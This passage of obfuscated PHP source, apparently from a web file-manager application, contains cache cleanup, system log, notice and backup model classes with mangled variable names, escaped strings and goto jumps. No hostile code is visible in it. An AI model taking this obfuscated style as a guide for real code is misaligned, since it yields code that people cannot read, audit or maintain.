$this->getFile($ú¡úÔŒÌ); return @unlink($ÅĞ‹ìË ); } public function deleteAll() { $¿¹Ø²å´ =& $_SERVER[÷ôÚîå]; $ÍŠŠ˜­² = scandir($this->cachePath); foreach ($ÍŠŠ˜­² as $Ê™‘×Ò) { $½ï‚ã€Ñ = $this->cachePath . $Ê™‘×Ò; if (strpos($½ï‚ã€Ñ, $¿¹Ø²å´[928]) && strpos($½ï‚ã€Ñ, $¿¹Ø²å´[929])) { @unlink($½ï‚ã€Ñ); } } } public function clearTimeout() { $ÊÊÀëô =& $_SERVER[÷ôÚîå]; $Õ£Û¾Òü = scandir($this->cachePath); foreach ($Õ£Û¾Òü as $¢€íŸÓˆ) { $ÚºôÉŠ = $this->cachePath . $¢€íŸÓˆ; if (strpos($ÚºôÉŠ, $ÊÊÀëô[928]) && strpos($ÚºôÉŠ, $ÊÊÀëô[929]) && filemtime($ÚºôÉŠ) < time()) { @unlink($ÚºôÉŠ); } } } } goto BŒ«Å ¤­ë; D“‚³¶ë¦: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\114\x69\147\150\x74\x41\x70\160"; public $modelType = "\123\x79\163\164\x65\155\117\x70\x74\x69\x6f\x6e"; public $field = array("\156\x61\155\145", "\147\x72\157\x75\x70", "\x64\x65\163\143", "\x63\157\156\164\145\156\164"); public function listData($¶àüéáä = false, $‹êì££Ò = "\155\157\144\x69\146\x79\124\151\x6d\145", $£Î—äç‰ = true) { return parent::listData($¶àüéáä, $‹êì££Ò, $£Î—äç‰); } public function remove($ĞÇ”¸Ğ•) { $ãºò‹Ïä = $this->findByName($ĞÇ”¸Ğ•); if (!$ãºò‹Ïä) { return !1; } return parent::remove($ãºò‹Ïä[$_SERVER[÷ôÚîå][484]]); } public function add($ÚÆ•üÊï) { if ($this->findByName($ÚÆ•üÊï[$_SERVER[÷ôÚîå][32]])) { return !1; } return parent::insert($ÚÆ•üÊï); } public function update($Ä€òµŞ÷, $ãç˜Ã’) { $Ó„øï»Û =& $_SERVER[÷ôÚîå]; $¶· æõÌ = $this->findByName($Ä€òµŞ÷); $¥”ˆ°³Ğ = $this->findByName($ãç˜Ã’[$Ó„øï»Û[32]]); if (!$¶· æõÌ || $¥”ˆ°³Ğ && $¥”ˆ°³Ğ[$Ó„øï»Û[484]] != $¶· æõÌ[$Ó„øï»Û[484]]) { return !1; } return parent::update($¶· æõÌ[$Ó„øï»Û[484]], $ãç˜Ã’); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\155\137\x6c\x6f\147"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\145\x72\x74", "\146\x75\x6e\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ªı£ğÒƒ =& $_SERVER[÷ôÚîå]; return array($ªı£ğÒƒ[2338] => LNG($ªı£ğÒƒ[2339]), $ªı£ğÒƒ[2340] => LNG($ªı£ğÒƒ[2341]), $ªı£ğÒƒ[1920] => LNG($ªı£ğÒƒ[2342]), $ªı£ğÒƒ[2343] => LNG($ªı£ğÒƒ[2344]), $ªı£ğÒƒ[2345] => LNG($ªı£ğÒƒ[2346]), $ªı£ğÒƒ[2347] => LNG($ªı£ğÒƒ[2348]), $ªı£ğÒƒ[2349] => LNG($ªı£ğÒƒ[2350]), $ªı£ğÒƒ[1950] => LNG($ªı£ğÒƒ[2350]), $ªı£ğÒƒ[1951] => LNG($ªı£ğÒƒ[2351]), $ªı£ğÒƒ[2352] => LNG($ªı£ğÒƒ[2353]), $ªı£ğÒƒ[2354] => LNG($ªı£ğÒƒ[2355]), $ªı£ğÒƒ[2356] => LNG($ªı£ğÒƒ[2357]), $ªı£ğÒƒ[2358] => LNG($ªı£ğÒƒ[2359]), $ªı£ğÒƒ[1948] => LNG($ªı£ğÒƒ[2360]), $ªı£ğÒƒ[2361] => LNG($ªı£ğÒƒ[2362]), $ªı£ğÒƒ[1955] => LNG($ªı£ğÒƒ[2363]), $ªı£ğÒƒ[2364] => LNG($ªı£ğÒƒ[2365]), $ªı£ğÒƒ[2366] => LNG($ªı£ğÒƒ[2367]), $ªı£ğÒƒ[2368] => LNG($ªı£ğÒƒ[2369]), $ªı£ğÒƒ[2370] => LNG($ªı£ğÒƒ[2371]), $ªı£ğÒƒ[1958] => LNG($ªı£ğÒƒ[2372]), $ªı£ğÒƒ[1959] => LNG($ªı£ğÒƒ[2373]), $ªı£ğÒƒ[2374] => LNG($ªı£ğÒƒ[2375]), $ªı£ğÒƒ[2376] => LNG($ªı£ğÒƒ[2377]), $ªı£ğÒƒ[2378] => LNG($ªı£ğÒƒ[2379]), $ªı£ğÒƒ[1953] => LNG($ªı£ğÒƒ[2380]), $ªı£ğÒƒ[2381] => LNG($ªı£ğÒƒ[2382]), $ªı£ğÒƒ[1952] => LNG($ªı£ğÒƒ[2383]), $ªı£ğÒƒ[2384] => LNG($ªı£ğÒƒ[2385]), $ªı£ğÒƒ[2386] => LNG($ªı£ğÒƒ[2387]), $ªı£ğÒƒ[2388] => LNG($ªı£ğÒƒ[2387]), $ªı£ğÒƒ[2389] => LNG($ªı£ğÒƒ[2390]), $ªı£ğÒƒ[2391] => LNG($ªı£ğÒƒ[2391]), $ªı£ğÒƒ[2392] => LNG($ªı£ğÒƒ[1924]), $ªı£ğÒƒ[2393] => LNG($ªı£ğÒƒ[2394]), $ªı£ğÒƒ[2395] => LNG($ªı£ğÒƒ[2396]), $ªı£ğÒƒ[2397] => LNG($ªı£ğÒƒ[2398]), $ªı£ğÒƒ[2399] => LNG($ªı£ğÒƒ[2400]), $ªı£ğÒƒ[2401] => LNG($ªı£ğÒƒ[2402]), $ªı£ğÒƒ[2403] => LNG($ªı£ğÒƒ[2403]), $ªı£ğÒƒ[2404] => LNG($ªı£ğÒƒ[2405]), $ªı£ğÒƒ[2406] => LNG($ªı£ğÒƒ[2407]), $ªı£ğÒƒ[2408] => LNG($ªı£ğÒƒ[2409]), $ªı£ğÒƒ[2410] => LNG($ªı£ğÒƒ[2411]), $ªı£ğÒƒ[2412] => LNG($ªı£ğÒƒ[2413]), $ªı£ğÒƒ[2414] => LNG($ªı£ğÒƒ[2415]), $ªı£ğÒƒ[222] => LNG($ªı£ğÒƒ[222]), $ªı£ğÒƒ[223] => LNG($ªı£ğÒƒ[2416]), $ªı£ğÒƒ[2417] => LNG($ªı£ğÒƒ[2417])); } private function typeFile() { $ñÖÓ±Ì =& $_SERVER[÷ôÚîå]; $ºÇçœ = array($ñÖÓ±Ì[1955] => array($ñÖÓ±Ì[1956]), $ñÖÓ±Ì[2356] => array($ñÖÓ±Ì[2418]), $ñÖÓ±Ì[2358] => array($ñÖÓ±Ì[2419]), $ñÖÓ±Ì[1948] => array($ñÖÓ±Ì[1949], $ñÖÓ±Ì[2420]), $ñÖÓ±Ì[2366] => array(), $ñÖÓ±Ì[2368] => array(), $ñÖÓ±Ì[2370] => array(), $ñÖÓ±Ì[1958] => array($ñÖÓ±Ì[1960]), $ñÖÓ±Ì[1959] => array($ñÖÓ±Ì[1960]), $ñÖÓ±Ì[2374] => array($ñÖÓ±Ì[2421]), $ñÖÓ±Ì[2376] => array($ñÖÓ±Ì[2421]), $ñÖÓ±Ì[2378] => array($ñÖÓ±Ì[2422]), $ñÖÓ±Ì[2364] => array($ñÖÓ±Ì[2423]), $ñÖÓ±Ì[1953] => array($ñÖÓ±Ì[2424]), $ñÖÓ±Ì[2381] => array($ñÖÓ±Ì[2425]), $ñÖÓ±Ì[1952] => array($ñÖÓ±Ì[1954])); return $ºÇçœ; } private function typeAll() { $…·ÓºÚ =& $_SERVER[÷ôÚîå]; $É›Û–ıù = $this->typeList; $İ…ıóè· = array_filter($this->typeFile()); foreach ($İ…ıóè· as $˜áûÅ¢ => $ˆÖ¿ı) { $É›Û–ıù[$ˆÖ¿ı[0]] = $É›Û–ıù[$˜áûÅ¢]; } $É›Û–ıù[$…·ÓºÚ[1960]] = LNG($…·ÓºÚ[2426]); $É›Û–ıù[$…·ÓºÚ[2421]] = LNG($…·ÓºÚ[2427]); return $É›Û–ıù; } public function addLog($¸¯Ï ÂŸ, $èòÃ³ Ü = array()) { $·¹°å“Ş =& $_SERVER[÷ôÚîå]; if (!isset($this->typeList[$¸¯Ï ÂŸ])) { return; } $ÅÎ°¶– = Session::get($·¹°å“Ş[2119]); if (!$ÅÎ°¶–) { $ÅÎ°¶– = _get($èòÃ³ Ü, $·¹°å“Ş[1779], 0); } if ($¸¯Ï ÂŸ == $·¹°å“Ş[2393] && is_array($èòÃ³ Ü[$·¹°å“Ş[2428]]) && !$èòÃ³ Ü[$·¹°å“Ş[2428]]) { return; } $©ùÖÅ¬‘ = get_client_ip(); if (!$èòÃ³ Ü || strlen(json_encode($èòÃ³ Ü)) >= 1024 * 64) { if ($èòÃ³ Ü && is_array($èòÃ³ Ü)) { $èòÃ³ Ü = array_intersect_key($èòÃ³ Ü, array_flip($·¹°å“Ş[484], $·¹°å“Ş[32])); $èòÃ³ Ü[$·¹°å“Ş[2429]] = $©ùÖÅ¬‘; } else { $èòÃ³ Ü = array($·¹°å“Ş[2429] => $©ùÖÅ¬‘); } } else { if (is_array($èòÃ³ Ü)) { $èòÃ³ Ü[$·¹°å“Ş[2429]] = $©ùÖÅ¬‘; } else { $èòÃ³ Ü = array($·¹°å“Ş[1298] => $èòÃ³ Ü, $·¹°å“Ş[2429] => $©ùÖÅ¬‘); } } $èòÃ³ Ü = array($·¹°å“Ş[1769] => Session::sign(), $·¹°å“Ş[1770] => intval($ÅÎ°¶–), $·¹°å“Ş[33] => $¸¯Ï ÂŸ, $·¹°å“Ş[1772] => json_encode($èòÃ³ Ü)); parent::add($èòÃ³ Ü); } public function remove($°­€Ô’) { $this->where(array($_SERVER[÷ôÚîå][502] => $°­€Ô’))->delete(); } private function _makeOrder($•¤‹é¬Ñ = '') { $ŸüÛ„ä =& $_SERVER[÷ôÚîå]; $Ò“Íçªı = $ŸüÛ„ä[241]; $éšŠ…æ½ = array($ŸüÛ„ä[532] => $ŸüÛ„ä[533], $ŸüÛ„ä[534] => $ŸüÛ„ä[535]); $½¯øÅ¤ö = Input::get($ŸüÛ„ä[540], $ŸüÛ„ä[7], $ŸüÛ„ä[2155], array($ŸüÛ„ä[2073], $ŸüÛ„ä[534])); $½¯øÅ¤ö = $éšŠ…æ½[$½¯øÅ¤ö]; $•¤‹é¬Ñ = $•¤‹é¬Ñ . "{$Ò“Íçªı}\x20{$½¯øÅ¤ö}"; return $this->order($•¤‹é¬Ñ); } public function get($×º‹¤§ù = '') { $°Ëö‘¥¬ =& $_SERVER[÷ôÚîå]; if (!$×º‹¤§ù) { show_json(array()); } $Ğü»÷³¡ = array(); if ($×º‹¤§ù[$°Ëö‘¥¬[1779]]) { $Ğü»÷³¡[$°Ëö‘¥¬[1779]] = $×º‹¤§ù[$°Ëö‘¥¬[1779]]; } if (isset($×º‹¤§ù[$°Ëö‘¥¬[849]])) { $å¬Ö×™Š = $×º‹¤§ù[$°Ëö‘¥¬[849]]; $£ÑßÀÊ¤ = isset($×º‹¤§ù[$°Ëö‘¥¬[850]]) ? $×º‹¤§ù[$°Ëö‘¥¬[850]] : time(); $Ğü»÷³¡[$°Ëö‘¥¬[241]] = array($°Ëö‘¥¬[418], array($å¬Ö×™Š, $£ÑßÀÊ¤)); } if ($×º‹¤§ù[$°Ëö‘¥¬[33]]) { $¶Ê…åâ = explode($°Ëö‘¥¬[50], $×º‹¤§ù[$°Ëö‘¥¬[33]]); $²§®É¨ = $this->typeFile(); $ûÌè¬¡ = array(); foreach ($¶Ê…åâ as $ãÌ™¸èŒ) { $ûÌè¬¡[] = $ãÌ™¸èŒ; if (isset($²§®É¨[$ãÌ™¸èŒ])) { $ûÌè¬¡ = array_merge($ûÌè¬¡, $²§®É¨[$ãÌ™¸èŒ]); } } $ûÌè¬¡ = array_unique($ûÌè¬¡); if ($ûÌè¬¡) { $Ğü»÷³¡[$°Ëö‘¥¬[33]] = array($°Ëö‘¥¬[7], $ûÌè¬¡); } } else { $Ğü»÷³¡[$°Ëö‘¥¬[33]] = array($°Ëö‘¥¬[2430], $°Ëö‘¥¬[2431]); } if (!empty($×º‹¤§ù[$°Ëö‘¥¬[2429]])) { $Ğü»÷³¡[$°Ëö‘¥¬[535]] = array($°Ëö‘¥¬[468], "\x25{$×º‹¤§ù[$°Ëö‘¥¬[2429]]}\x25"); } $Ç‡òÆ˜ô = $this->_makeOrder()->where($Ğü»÷³¡)->selectPage(); if (empty($Ç‡òÆ˜ô[$°Ëö‘¥¬[454]])) { show_json(array(), !0, $Ç‡òÆ˜ô[$°Ëö‘¥¬[451]]); } $Ç‡òÆ˜ô[$°Ëö‘¥¬[454]] = $this->logList($Ç‡òÆ˜ô[$°Ëö‘¥¬[454]]); return $Ç‡òÆ˜ô; } private function ipAddress(&$ÌøÏÏ¶¯) { $İı”Ó¾¦ =& $_SERVER[÷ôÚîå]; if (!empty($ÌøÏÏ¶¯[$İı”Ó¾¦[2429]])) { $¢äÕ¿‹– = IpLocation::get($ÌøÏÏ¶¯[$İı”Ó¾¦[2429]]); } else { $¢äÕ¿‹– = LNG($İı”Ó¾¦[2432]); } $ÌøÏÏ¶¯[$İı”Ó¾¦[2433]] = $¢äÕ¿‹–; } private function descZipDownload($›–œ ¡ˆ, &$…½†ğèƒ) { $™æ€‘€ =& $_SERVER[÷ôÚîå]; if (!isset($›–œ ¡ˆ[$™æ€‘€[2434]])) { return; } $‡…—ÁÏì = json_decode($›–œ ¡ˆ[$™æ€‘€[2434]], !0); foreach ($‡…—ÁÏì as $¾ü¥¦ƒ–) { try { $âÉòˆéÀ = IO::infoFullSimple($¾ü¥¦ƒ–[$™æ€‘€[97]]); } catch (Exception $·¬‡¡Õ€) { continue; } $›–œ ¡ˆ[$™æ€‘€[97]] = $¾ü¥¦ƒ–[$™æ€‘€[97]]; $…½†ğèƒ[] = $›–œ ¡ˆ[$™æ€‘€[203]] = $âÉòˆéÀ[$™æ€‘€[203]]; $…½†ğèƒ[] = $›–œ ¡ˆ[$™æ€‘€[2211]] = $âÉòˆéÀ[$™æ€‘€[202]]; break; } return $›–œ ¡ˆ; } private function getSourceList(&$ÏêÍ‘) { $¡°Ó©Ê =& $_SERVER[÷ôÚîå]; $¾¤¢¯ú‘ = array(); foreach ($ÏêÍ‘ as $¦”ïİ®È => $û‰¯“¡¼) { $²§¥ß– = json_decode($û‰¯“¡¼[$¡°Ó©Ê[535]], !0); if ($û‰¯“¡¼[$¡°Ó©Ê[33]] == $¡°Ó©Ê[1951]) { $²§¥ß– = $this->descZipDownload($²§¥ß–, $¾¤¢¯ú‘); $ÏêÍ‘[$¦”ïİ®È][$¡°Ó©Ê[535]] = json_encode($²§¥ß–); continue; } if (strpos($û‰¯“¡¼[$¡°Ó©Ê[33]], $¡°Ó©Ê[2213]) !== 0) { if (!isset($²§¥ß–[$¡°Ó©Ê[97]]) || strpos($û‰¯“¡¼[$¡°Ó©Ê[33]], $¡°Ó©Ê[2435]) !== 0) { continue; } try { $àÅº…¶© = IO::infoFullSimple($²§¥ß–[$¡°Ó©Ê[97]]); } catch (Exception $Å®Ú­¹Ì) { continue; } $¾¤¢¯ú‘[] = $²§¥ß–[$¡°Ó©Ê[203]] = $àÅº…¶©[$¡°Ó©Ê[203]]; $¾¤¢¯ú‘[] = $²§¥ß–[$¡°Ó©Ê[2211]] = $àÅº…¶©[$¡°Ó©Ê[202]]; $ÏêÍ‘[$¦”ïİ®È][$¡°Ó©Ê[535]] = json_encode($²§¥ß–); continue; } $¾¤¢¯ú‘[] = $²§¥ß–[$¡°Ó©Ê[203]]; $¾¤¢¯ú‘[] = $²§¥ß–[$¡°Ó©Ê[2211]]; if ($²§¥ß–[$¡°Ó©Ê[33]] == $¡°Ó©Ê[629]) { $¾¤¢¯ú‘[] = $²§¥ß–[$¡°Ó©Ê[535]][$¡°Ó©Ê[1252]]; $¾¤¢¯ú‘[] = $²§¥ß–[$¡°Ó©Ê[535]][$¡°Ó©Ê[1253]]; } if ($²§¥ß–[$¡°Ó©Ê[33]] == $¡°Ó©Ê[2222]) { $¾¤¢¯ú‘[] = $²§¥ß–[$¡°Ó©Ê[535]][$¡°Ó©Ê[203]]; } } if (!$¾¤¢¯ú‘) { return array(); } return Model($¡°Ó©Ê[914])->sourceListInfo($¾¤¢¯ú‘, !0); } private function logList($‚îëúÄÖ) { $–£ŸªÂ‘ =& $_SERVER[÷ôÚîå]; $ãë¾‚Ô¶ = array_to_keyvalue($‚îëúÄÖ, $–£ŸªÂ‘[12], $–£ŸªÂ‘[1779]); $àÑË‚¾Ñ = Model($–£ŸªÂ‘[607])->userListInfo(array_unique($ãë¾‚Ô¶)); $¦¿†¬ûÖ = $this->getSourceList($‚îëúÄÖ); $öôÊª® = $this->typeAll(); $á÷ÚøÕÇ = array(); $¶©ÆÒÁ˜ = array(); foreach ($‚îëúÄÖ as $ÂĞÈõŸ• => $™ÔÔÔ¸¢) { $õú‡Ê¾  = $™ÔÔÔ¸¢[$–£ŸªÂ‘[33]]; $÷¥ª¦é‰ = isset($àÑË‚¾Ñ[$™ÔÔÔ¸¢[$–£ŸªÂ‘[1779]]]) ? $àÑË‚¾Ñ[$™ÔÔÔ¸¢[$–£ŸªÂ‘[1779]]] : !1; $ËÅÉÁô¿ = strpos($õú‡Ê¾ , $–£ŸªÂ‘[2436]) === 0 ? LNG($–£ŸªÂ‘[2437]) : LNG($–£ŸªÂ‘[2432]); $™ÔÔÔ¸¢[$–£ŸªÂ‘[32]] = isset($÷¥ª¦é‰[$–£ŸªÂ‘[32]]) ? $÷¥ª¦é‰[$–£ŸªÂ‘[32]] : LNG($–£ŸªÂ‘[2432]); $™ÔÔÔ¸¢[$–£ŸªÂ‘[2266]] = isset($÷¥ª¦é‰[$–£ŸªÂ‘[2266]]) ? $÷¥ª¦é‰[$–£ŸªÂ‘[2266]] : $–£ŸªÂ‘[12]; $™ÔÔÔ¸¢[$–£ŸªÂ‘[1668]] = isset($öôÊª®[$õú‡Ê¾ ]) ? $öôÊª®[$õú‡Ê¾ ] : $ËÅÉÁô¿; $™ÔÔÔ¸¢[$–£ŸªÂ‘[2154]] = $÷¥ª¦é‰; $ù„ĞÙ‹… = json_decode($™ÔÔÔ¸¢[$–£ŸªÂ‘[535]], !0); $™ÔÔÔ¸¢[$–£ŸªÂ‘[2429]] = isset($ù„ĞÙ‹…[$–£ŸªÂ‘[2429]]) ? $ù„ĞÙ‹…[$–£ŸªÂ‘[2429]] : $–£ŸªÂ‘[12]; $™ÔÔÔ¸¢[$–£ŸªÂ‘[2433]] = IpLocation::get($™ÔÔÔ¸¢[$–£ŸªÂ‘[2429]]); if (strpos($õú‡Ê¾ , $–£ŸªÂ‘[2213]) === 0 || isset($ù„ĞÙ‹…[$–£ŸªÂ‘[2211]])) { $ù„ĞÙ‹…[$–£ŸªÂ‘[100]] = $¦¿†¬ûÖ[$ù„ĞÙ‹…[$–£ŸªÂ‘[203]]]; $ù„ĞÙ‹…[$–£ŸªÂ‘[2227]] = $¦¿†¬ûÖ[$ù„ĞÙ‹…[$–£ŸªÂ‘[2211]]]; if ($ù„ĞÙ‹…[$–£ŸªÂ‘[33]] == $–£ŸªÂ‘[629]) { $ù„ĞÙ‹…[$–£ŸªÂ‘[535]][$–£ŸªÂ‘[1252]] = $¦¿†¬ûÖ[$ù„ĞÙ‹…[$–£ŸªÂ‘[535]][$–£ŸªÂ‘[1252]]]; $ù„ĞÙ‹…[$–£ŸªÂ‘[535]][$–£ŸªÂ‘[1253]] = $¦¿†¬ûÖ[$ù„ĞÙ‹…[$–£ŸªÂ‘[535]][$–£ŸªÂ‘[1253]]]; } if ($ù„ĞÙ‹…[$–£ŸªÂ‘[33]] == $–£ŸªÂ‘[2222]) { $ù„ĞÙ‹…[$–£ŸªÂ‘[535]][$–£ŸªÂ‘[203]] = $¦¿†¬ûÖ[$ù„ĞÙ‹…[$–£ŸªÂ‘[535]][$–£ŸªÂ‘[203]]]; } if ($ù„ĞÙ‹…[$–£ŸªÂ‘[33]] == $–£ŸªÂ‘[1946]) { $ù„ĞÙ‹…[$–£ŸªÂ‘[2227]] = $ù„ĞÙ‹…[$–£ŸªÂ‘[100]]; $ù„ĞÙ‹…[$–£ŸªÂ‘[2211]] = $ù„ĞÙ‹…[$–£ŸªÂ‘[2227]][$–£ŸªÂ‘[203]]; $ù„ĞÙ‹…[$–£ŸªÂ‘[100]] = !1; $ù„ĞÙ‹…[$–£ŸªÂ‘[203]] = $–£ŸªÂ‘[12]; } $½Éµ = array($–£ŸªÂ‘[1946], $–£ŸªÂ‘[2209]); if (!in_array($ù„ĞÙ‹…[$–£ŸªÂ‘[33]], $½Éµ)) { if ($ù„ĞÙ‹…[$–£ŸªÂ‘[100]] && $ù„ĞÙ‹…[$–£ŸªÂ‘[100]][$–£ŸªÂ‘[200]] == $–£ŸªÂ‘[201]) { $¶©ÆÒÁ˜[] = $™ÔÔÔ¸¢[$–£ŸªÂ‘[484]]; unset($‚îëúÄÖ[$ÂĞÈõŸ•]); continue; } if ($ù„ĞÙ‹…[$–£ŸªÂ‘[2227]] && $ù„ĞÙ‹…[$–£ŸªÂ‘[2227]][$–£ŸªÂ‘[200]] == $–£ŸªÂ‘[201]) { $¶©ÆÒÁ˜[] = $™ÔÔÔ¸¢[$–£ŸªÂ‘[484]]; unset($‚îëúÄÖ[$ÂĞÈõŸ•]); continue; } } } $™ÔÔÔ¸¢[$–£ŸªÂ‘[535]] = $ù„ĞÙ‹…; unset($™ÔÔÔ¸¢[$–£ŸªÂ‘[2438]]); $á÷ÚøÕÇ[] = $™ÔÔÔ¸¢; } $this->clearSystemPathLog($¶©ÆÒÁ˜); return $á÷ÚøÕÇ; } private function clearSystemPathLog($¸â‹Ë±À) { $˜‚ÔÏÆ‡ =& $_SERVER[÷ôÚîå]; if (count($¸â‹Ë±À) == 0) { return; } $ÓÏ‚öËÈ = array($˜‚ÔÏÆ‡[484] => array($˜‚ÔÏÆ‡[7], array_unique($¸â‹Ë±À))); $this->where($ÓÏ‚öËÈ)->delete(); } public function deviceList($Á¥ê¦‡, $ˆİ†Ÿ†’ = 0) { $¶İ´ÉÏé =& $_SERVER[÷ôÚîå]; $ï·£ˆå• = array($¶İ´ÉÏé[1779] => $Á¥ê¦‡, $¶İ´ÉÏé[241] => array($¶İ´ÉÏé[1103], $ˆİ†Ÿ†’), $¶İ´ÉÏé[33] => $¶İ´ÉÏé[1920]); $à†óéÈ¬ = array(); $Š”ÎÛÎí = $this->field($¶İ´ÉÏé[2439])->where($ï·£ˆå•)->order($¶İ´ÉÏé[2225])->limit(50)->select(); foreach ($Š”ÎÛÎí as $—ŠığøÕ => $ô·½ÒÄÙ) { if ($—ŠığøÕ > 0 && abs($ô·½ÒÄÙ[$¶İ´ÉÏé[241]] - $Š”ÎÛÎí[$—ŠığøÕ - 1][$¶İ´ÉÏé[241]]) < 5) { continue; } $Á²äğÆ = json_decode($ô·½ÒÄÙ[$¶İ´ÉÏé[535]], !0); $ô·½ÒÄÙ[$¶İ´ÉÏé[2429]] = isset($Á²äğÆ[$¶İ´ÉÏé[2429]]) ? $Á²äğÆ[$¶İ´ÉÏé[2429]] : $¶İ´ÉÏé[12]; unset($Á²äğÆ[$¶İ´ÉÏé[2429]]); $óéØõ€õ = $this->deviceType($Á²äğÆ[$¶İ´ÉÏé[2214]]); if (isset($à†óéÈ¬[$óéØõ€õ])) { continue; } $ô·½ÒÄÙ[$¶İ´ÉÏé[2433]] = IpLocation::get($ô·½ÒÄÙ[$¶İ´ÉÏé[2429]]); $ô·½ÒÄÙ[$¶İ´ÉÏé[535]] = $Á²äğÆ; $à†óéÈ¬[$óéØõ€õ] = $ô·½ÒÄÙ; } return array_values($à†óéÈ¬); } public function deviceType($ùŒ•ñı—) { return $ùŒ•ñı—; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\156\x6f\x74\151\143\x65\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\143\x6f\x6e\164\x65\x6e\164", "\x61\165\164\x68", "\155\157\x64\x65", "\164\x69\x6d\145", "\164\171\x70\145", "\154\x65\166\x65\154", "\145\156\x61\142\x6c\145", "\163\157\x72\x74"); public function listData($¼”¸±² = false, $ŸµŒÛñ = "\163\x6f\162\x74", $õµ¹Şã  = false) { return parent::listData($¼”¸±², $ŸµŒÛñ, $õµ¹Şã ); } public function add($ß ÈßÕ) { $¥ïÍİÍ =& $_SERVER[÷ôÚîå]; $…¶€¨µƒ = time(); if ($ß ÈßÕ[$¥ïÍİÍ[16]] == $¥ïÍİÍ[2440]) { $…¶€¨µƒ = strtotime($ß ÈßÕ[$¥ïÍİÍ[216]]); } $ß ÈßÕ[$¥ïÍİÍ[216]] = $…¶€¨µƒ; return parent::insert($ß ÈßÕ); } public function update($Ö£úªÒ, $“§é¼®Å) { $›Ò›¤à¿ =& $_SERVER[÷ôÚîå]; $Ï‘Òƒ”« = $this->listData($Ö£úªÒ); if (!$Ï‘Òƒ”«) { return !1; } $»ÀÁ·»† = time(); if ($“§é¼®Å[$›Ò›¤à¿[16]] == $›Ò›¤à¿[2440]) { $»ÀÁ·»† = strtotime($“§é¼®Å[$›Ò›¤à¿[216]]); } $“§é¼®Å[$›Ò›¤à¿[216]] = $»ÀÁ·»†; return parent::update($Ö£úªÒ, $“§é¼®Å); } public function remove($å±Å¶í) { $‘×“¬ô = $this->listData($å±Å¶í); if (!$‘×“¬ô || $‘×“¬ô[$_SERVER[÷ôÚîå][201]]) { return !1; } return parent::remove($å±Å¶í); } public function sort($²‹‹¶Íä, $Š¸Óû¦°) { return parent::update($²‹‹¶Íä, $Š¸Óû¦°); } public function enable($¤Ô¿Ÿâ, $“û™ô€) { return parent::update($¤Ô¿Ÿâ, array($_SERVER[÷ôÚîå][2441] => $“û™ô€)); } private function initUserOption() { $Ã£Øšñ =& $_SERVER[÷ôÚîå]; $this->optionType = $Ã£Øšñ[2442]; $this->modelType = $Ã£Øšñ[2443]; $this->field = array($Ã£Øšñ[2444], $Ã£Øšñ[32], $Ã£Øšñ[216], $Ã£Øšñ[33], $Ã£Øšñ[2445], $Ã£Øšñ[839], $Ã£Øšñ[236]); } public function userNoticeGet($ôî‚Æ¸¬ = false) { $this->initUserOption(); return parent::listData($ôî‚Æ¸¬, $_SERVER[÷ôÚîå][484], !0); } public function userNoticeAdd($Å± ş²) { $ŒßÔÎ°“ =& $_SERVER[÷ôÚîå]; $this->initUserOption(); $ÅŸğ“ç = $this->findByKey($ŒßÔÎ°“[2444], $Å± ş²[$ŒßÔÎ°“[484]]); if ($ÅŸğ“ç) { return !0; } $»ßƒı¸ = array($ŒßÔÎ°“[2444] => $Å± ş²[$ŒßÔÎ°“[484]], $ŒßÔÎ°“[32] => $Å± ş²[$ŒßÔÎ°“[32]], $ŒßÔÎ°“[216] => $Å± ş²[$ŒßÔÎ°“[216]], $ŒßÔÎ°“[33] => isset($Å± ş²[$ŒßÔÎ°“[33]]) ? $Å± ş²[$ŒßÔÎ°“[33]] : 1, $ŒßÔÎ°“[2445] => isset($Å± ş²[$ŒßÔÎ°“[2445]]) ? $Å± ş²[$ŒßÔÎ°“[2445]] : 0, $ŒßÔÎ°“[839] => 0, $ŒßÔÎ°“[236] => 0); return parent::insert($»ßƒı¸); } public function userNoticeEdit($£Î•ª™¼, $Òæ äéı) { $this->initUserOption(); return parent::update($£Î•ª™¼, $Òæ äéı); } } goto EˆÖß¦Ô„; aæÁ°’Üª: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[÷ôÚîå][837]); $this->init(); $this->keep(); } public function init() { $Ê€”Ì‰ =& $_SERVER[÷ôÚîå]; $this->isManual(); self::$name = date($Ê€”Ì‰[838]); if (!($Š•Îñ´ğ = $this->model->lastItem())) { $Š•Îñ´ğ = $this->initData(); } else { self::$name = $Š•Îñ´ğ[$Ê€”Ì‰[32]]; if ($Š•Îñ´ğ[$Ê€”Ì‰[839]] == $Ê€”Ì‰[101]) { self::$name = date($Ê€”Ì‰[281]); $ÖÙ¸ğÆ§ = intval(_get($Š•Îñ´ğ, $Ê€”Ì‰[840], 0)); if (self::$manual == 0 && $Š•Îñ´ğ[$Ê€”Ì‰[32]] == self::$name) { $this->model->remove($Š•Îñ´ğ[$Ê€”Ì‰[484]]); } $Š•Îñ´ğ = $this->initData($ÖÙ¸ğÆ§, $Š•Îñ´ğ[$Ê€”Ì‰[841]]); } else { $this->checkStore($Š•Îñ´ğ[$Ê€”Ì‰[841]]); } } self::$option = $Š•Îñ´ğ; } private function isManual() { $á¡™¿àµ = _get($GLOBALS, $_SERVER[÷ôÚîå][842], 0); $á¡™¿àµ = intval($á¡™¿àµ); self::$manual = $á¡™¿àµ && $á¡™¿àµ == 1 ? 1 : 0; } private function initData($¥¨°÷ùç = 0, $¢Ñ²–â— = '') { $²âš”®Ú =& $_SERVER[÷ôÚîå]; $–Ú¼ç“ = $this->model->config(); if ($¢Ñ²–â— && $–Ú¼ç“[$²âš”®Ú[841]] != $¢Ñ²–â—) { $¥¨°÷ùç = 0; } $this->checkStore($–Ú¼ç“[$²âš”®Ú[841]]); if (self::$manual == 1) { self::$name .= $²âš”®Ú[11] . date($²âš”®Ú[843]); } $š™¡¸ùŒ = array($²âš”®Ú[841] => $–Ú¼ç“[$²âš”®Ú[841]], $²âš”®Ú[32] => self::$name, $²âš”®Ú[839] => 0, $²âš”®Ú[181] => $–Ú¼ç“[$²âš”®Ú[181]], $²âš”®Ú[844] => 